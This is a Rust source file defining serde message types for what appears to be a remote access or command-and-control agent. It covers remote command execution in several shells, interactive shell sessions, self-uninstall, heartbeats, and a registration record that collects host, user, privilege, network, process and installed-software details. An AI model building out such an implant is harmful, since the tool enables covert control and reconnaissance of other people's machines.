// src/model/base.rs
use serde::{Serialize, Deserialize};


#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Instruction{
    session: String,
    r#type: String,         // exec,start_full_shell,uninstall,set_frequency,nop
    command: Option<Command>,
    data: Option<String>,       // 不同指令所需要的附加数据

}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct InstructionReturn{
    session: String,
    r#type: String,
    command_return: Option<CommandReturn>,
    data: Option<String>,

}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Command{
    content: String,
    dir: Option<String>,
    shell: String,       // cmd,pwsh,bash,python
    timeout: Option<u32>,       // 秒
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandReturn{
    ok: bool,
    exit_code: Option<i32>,
    dir: Option<String>,
    output: String,
    error: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FullShellSend{
    session: String,
    content: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FullShellReturn{
    session: String,
    output: Option<String>,
    error: Option<String>,
    exit_code: Option<i32>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Register{
    pub sys_info: SystemInfo,

}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Heartbeat{
    pub timestamp: u64,
    pub uuid: String,
}


#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct SystemInfo {
    pub timestamp: u64,
    // ==================== 身份标识 ====================
    pub uuid: String,                    // 持久化唯一ID (无’-‘)
    pub hostname: String,
    pub username: String,
    pub domain: Option<String>,
    pub pid: u32,
    pub process_path: String,            // zzz 自身完整路径
    pub user_permissions: String,        // "admin", "user", "system/root", "high_integrity" 等


    // ==================== 系统信息 ====================
    pub os: String,                      // "windows", "linux", "macos", "unknown"
    pub os_version: String,              // 详细版本
    pub os_build: Option<String>,        // Windows Build 号 / Linux kernel 版本
    pub arch: String,                    // "x86_64", "aarch64", "x86", ...
    pub cpu: String,
    pub memory: String,
    pub disk: String,
    pub graphics_cards: Option<String>,
    pub systeminfo: Option<String>,   // systeminfo / hostnamectl


    // ==================== 环境 & 配置 ====================
    pub env: String,

    // ==================== 网络信息 ====================
    pub local_ip: String,
    pub external_ip: Option<String>,
    pub network_info: String, // ip addr/ipconfig /all

    // ==================== 进程 ====================
    pub installed_software: Option<String>,
    pub running_processes: Option<String>,

}

